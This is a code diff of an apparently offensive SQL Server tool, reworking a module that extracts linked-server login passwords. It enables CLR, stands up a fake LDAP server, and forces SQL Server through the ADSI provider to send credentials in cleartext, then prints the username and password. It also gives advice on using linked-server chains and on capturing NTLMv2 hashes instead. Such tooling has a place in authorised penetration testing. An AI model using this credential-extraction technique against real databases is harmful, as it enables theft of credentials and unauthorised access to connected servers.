@@ -3,92 +3,112 @@
 using MSSQLand.Services;
 using MSSQLand.Utilities;
 using System;
-using System.Collections.Generic;
 using System.Data;
 using System.Threading.Tasks;
 
 namespace MSSQLand.Actions.Remote
 {
     /// <summary>
-    /// Extracts credentials from ADSI linked servers.
-    /// https://www.tarlogic.com/blog/linked-servers-adsi-passwords
+    /// Extracts credentials from ADSI linked servers using LDAP simple bind interception.
+    /// 
+    /// Technique: Creates a fake LDAP server via CLR, then triggers an LDAP query through
+    /// the ADSI provider. SQL Server sends credentials in cleartext during LDAP simple bind.
+    /// 
+    /// Use Cases:
+    /// 1. Extract linked login password from existing ADSI server with mapped credentials
+    /// 2. Extract SQL login password when executing through a linked server chain
+    ///    (the linked server's configured login password, not your own)
+    /// 
+    /// Limitations:
+    /// - Windows/Kerberos auth uses GSSAPI (encrypted) - no cleartext password
+    /// - Direct SQL auth connection returns your own password (pointless)
+    /// 
+    /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords
     /// </summary>
     internal class AdsiCredentialExtractor : BaseAction
     {
-        private enum Mode { Self, Link }
-        
-        [ArgumentMetadata(Position = 0, Description = "Mode: self (create temporary ADSI server) or link <server> (use existing ADSI server)")]
-        private Mode _mode = Mode.Self;
-        
-        [ArgumentMetadata(Position = 1, Description = "Target ADSI server name (required for link mode)")]
+        [ArgumentMetadata(Position = 0, Description = "Target ADSI server name (optional - creates temporary server if omitted)")]
         private string _targetServer = "";
 
+        [ExcludeFromArguments]
+        private bool _useExistingServer = false;
 
         public override void ValidateArguments(string[] args)
         {
             if (args == null || args.Length == 0)
             {
-                // Default to self mode
-                _mode = Mode.Self;
+                // No args = create temporary ADSI server
+                _useExistingServer = false;
                 return;
             }
 
-            string[] parts = args;
-            string command = parts[0].ToLower();
-
-            switch (command)
-            {
-                case "self":
-                    _mode = Mode.Self;
-                    break;
-
-                case "link":
-                    if (parts.Length < 2)
-                    {
-                        throw new ArgumentException("Missing target ADSI server name. Example: adsicreds link SQL-ADSI");
-                    }
-                    _mode = Mode.Link;
-                    _targetServer = parts[1];
-                    break;
-
-                default:
-                    throw new ArgumentException("Invalid mode. Use 'self' or 'link <ServerName>'");
-            }
+            // First arg is the target ADSI server name
+            _targetServer = args[0];
+            _useExistingServer = true;
         }
 
 
         /// <summary>
-        /// Executes the chosen ADSI extraction method.
+        /// Executes the ADSI credential extraction.
         /// </summary>
         public override object Execute(DatabaseContext databaseContext)
         {
-            // Pre-check: Warn about authentication type limitations
             string authType = databaseContext.AuthService.CredentialsType;
-            if (_mode == Mode.Self && (authType == "windows" || authType == "token" || authType == "entraid"))
+            bool isExecutingThroughLinks = !databaseContext.QueryService.LinkedServers.IsEmpty;
+
+            // Check if this is a pointless scenario: direct SQL auth connection without links
+            if (!_useExistingServer && !isExecutingThroughLinks)
             {
-                Logger.Warning("It only works with SQL authentication (local credentials).");
-                Logger.WarningNested("Windows/Token/EntraID authentication uses GSSAPI (no cleartext password transmission).");
-                Logger.WarningNested("Continuing anyway - you may retrieve linked login credentials if configured");
+                if (authType == "sql" || authType == "local")
+                {
+                    Logger.Warning("Pointless operation: You're directly connected with SQL auth.");
+                    Logger.WarningNested("You already know your own password - there's nothing new to extract.");
+                    Logger.WarningNested("This technique is useful when:");
+                    Logger.WarningNested("  1. Targeting an existing ADSI server with mapped credentials");
+                    Logger.WarningNested("  2. Executing through a linked server chain (extracts the link's login)");
+                    Logger.NewLine();
+                    Logger.Info("Use 'adsi-creds <ADSI_SERVER>' to target an existing ADSI server, or");
+                    Logger.Info("Execute through a link: -l LINKED_SERVER -a adsi-creds");
+                    return null;
+                }
+                else if (authType == "windows" || authType == "token" || authType == "entraid")
+                {
+                    Logger.Warning("Windows/Token/EntraID authentication uses GSSAPI (no cleartext password).");
+                    Logger.WarningNested("This technique only works with SQL authentication.");
+                    Logger.WarningNested("Consider using 'smbcoerce' to capture NTLMv2 hash instead.");
+                    return null;
+                }
             }
 
-            if (_mode == Mode.Self)
+            // If executing through links, inform user what we're extracting
+            if (isExecutingThroughLinks && !_useExistingServer)
             {
-                return ExtractCredentialsSelf(databaseContext);
+                Logger.Info("Executing through linked server chain - will extract the link's SQL login password");
             }
 
-            if (_mode == Mode.Link)
+            if (_useExistingServer)
             {
-                return ExtractCredentials(databaseContext, _targetServer);
+                return ExtractFromExistingServer(databaseContext);
             }
-
-            Logger.Error("Unknown execution mode.");
-            return null;
+            else
+            {
+                return ExtractWithTemporaryServer(databaseContext);
+            }
         }
 
         /// <summary>
-        /// Creates a temporary ADSI server and extracts credentials, then cleans up.
+        /// Extracts credentials from an existing ADSI linked server.
         /// </summary>
-        private Tuple<string, string> ExtractCredentialsSelf(DatabaseContext databaseContext)
+        private Tuple<string, string> ExtractFromExistingServer(DatabaseContext databaseContext)
+        {
+            Logger.Task($"Extracting credentials from existing ADSI server '{_targetServer}'");
+            return ExtractCredentials(databaseContext, _targetServer);
+        }
+
+        /// <summary>
+        /// Creates a temporary ADSI server, extracts credentials, then cleans up.
+        /// </summary>
+        private Tuple<string, string> ExtractWithTemporaryServer(DatabaseContext databaseContext)
         {
             _targetServer = $"ADSI-{Guid.NewGuid().ToString("N").Substring(0, 6)}";
             
@@ -119,9 +139,7 @@ namespace MSSQLand.Actions.Remote
 
             try
             {
-                // Extract credentials
-                Tuple<string, string> credentials = ExtractCredentials(databaseContext, _targetServer);
-                return credentials;
+                return ExtractCredentials(databaseContext, _targetServer);
             }
             finally
             {
@@ -139,11 +157,8 @@ namespace MSSQLand.Actions.Remote
         }
 
         /// <summary>
-        /// Extracts credentials using an ADSI provider.
+        /// Extracts credentials using an ADSI provider by intercepting LDAP simple bind.
         /// </summary>
-        /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
-        /// <param name="adsiServer">The ADSI server to target</param>
-        /// <returns>A tuple containing the username and password.</returns>
         private Tuple<string, string> ExtractCredentials(DatabaseContext databaseContext, string adsiServer)
         {
             AdsiService adsiService = new(databaseContext);
@@ -152,10 +167,11 @@ namespace MSSQLand.Actions.Remote
             if (!adsiService.AdsiServerExists(adsiServer))
             {
                 Logger.Error($"ADSI linked server '{adsiServer}' not found.");
+                Logger.InfoNested("List available ADSI servers with: adsi-manager list");
                 return null;
             }
 
-            Logger.Task($"Extracting credentials using Active Directory Service Interfaces (ADSI) provider");
+            Logger.Task($"Extracting credentials via LDAP simple bind interception");
 
             if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
             {
@@ -177,14 +193,14 @@ namespace MSSQLand.Actions.Remote
 
                 string impersonateTarget = databaseContext.QueryService.ExecutionServer.ImpersonationUser;
 
-                string exploitQuery = $"SELECT * FROM OPENQUERY([{adsiServer}], 'SELECT * FROM ''LDAP://localhost:{adsiService.Port}'' ');";
-
                 if (!string.IsNullOrEmpty(impersonateTarget))
                 {
-                    Logger.Warning("You cannot retrieve impersonated user credentials since they are not mapped to your fake ADSI server");
+                    Logger.Warning("Cannot retrieve impersonated user credentials - not mapped to temporary ADSI server");
                     Logger.WarningNested("The impersonated context uses the original user's authentication method");
                     return null;
                 }
+
+                string exploitQuery = $"SELECT * FROM OPENQUERY([{adsiServer}], 'SELECT * FROM ''LDAP://localhost:{adsiService.Port}'' ');";
 
                 try
                 {
@@ -202,14 +218,14 @@ namespace MSSQLand.Actions.Remote
                 {
                     string rawCredentials = ldapResult.Rows[0][0].ToString();
                     
-                    // Split **only at the first occurrence** of `:`
+                    // Split only at the first occurrence of ':'
                     int splitIndex = rawCredentials.IndexOf(':');
                     if (splitIndex > 0)
                     {
                         string username = rawCredentials.Substring(0, splitIndex);
                         string password = rawCredentials.Substring(splitIndex + 1);
 
-                        Logger.Success("Credentials retrieved");
+                        Logger.Success("Credentials retrieved via LDAP simple bind");
                         Console.WriteLine($"Username: {username}");
                         Console.WriteLine($"Password: {password}");
 
@@ -222,28 +238,22 @@ namespace MSSQLand.Actions.Remote
                     }
                 }
 
-                // Check authentication type to provide helpful feedback
-                string authType = databaseContext.AuthService.CredentialsType;
-                if (authType == "windows" || authType == "token" || authType == "entraid")
-                {
-                    Logger.Warning("No credentials found - Windows/Token/EntraID authentication uses GSSAPI (encrypted).");
-                    Logger.WarningNested("This technique only retrieves cleartext passwords with SQL authentication.");
-                }
-                else if (_mode == Mode.Link)
+                // Provide helpful feedback based on context
+                if (_useExistingServer)
                 {
                     Logger.Warning("No credentials found - the ADSI server may not have a linked login configured.");
-                    Logger.WarningNested($"Check if '{adsiServer}' has a linked login: EXEC sp_helplinkedsrvlogin '{adsiServer}'");
+                    Logger.WarningNested($"Check linked logins: EXEC sp_helplinkedsrvlogin '{adsiServer}'");
                 }
                 else
                 {
-                    Logger.Warning("No credentials found - SQL authentication may not be configured correctly.");
+                    Logger.Warning("No credentials captured - connection may be using GSSAPI (Kerberos).");
                 }
                 
                 return null;
             }
             catch (Exception ex)
             {
-                Logger.Error($"Error occurred during the ADSI credentials retrieval exploit: {ex.Message}");
+                Logger.Error($"ADSI credential extraction failed: {ex.Message}");
                 return null;
             }
         }
